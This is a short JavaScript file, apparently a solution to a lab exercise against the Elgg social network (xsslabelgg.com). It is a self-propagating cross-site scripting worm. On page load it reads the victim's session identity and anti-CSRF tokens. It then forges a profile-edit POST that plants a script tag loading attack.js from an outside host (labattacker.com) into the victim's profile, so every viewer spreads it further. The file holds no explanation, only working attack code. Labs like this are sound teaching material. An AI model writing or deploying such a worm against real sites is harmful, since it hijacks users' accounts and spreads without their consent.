window.onload = function(){
        var username = elgg.session.user.name;
   	var guid = "&guid="+elgg.session.user.guid;
	var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token = "&__elgg_token="+elgg.security.token.__elgg_token;
	var headerTag = "<script id=\"worm\" type=\"text/javascript\" src=\"http://www.labattacker.com/attack.js\">";
	var tailTag = "</" + "script>";
        console.log(username);
        console.log(token);
	var wormCode = encodeURIComponent(headerTag + tailTag);
	var content = "accesslevel[briefdescription]=2&name="+username+"&briefdescription="+wormCode+guid+token+ts;
	
	if(elgg.session.user.guid!=47){
	sendurl="http://www.xsslabelgg.com/action/profile/edit/";
	var Ajax = null;
	Ajax = new XMLHttpRequest();
	Ajax.open("POST",sendurl,true);
	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send(content);
}

alert("XSSed");
};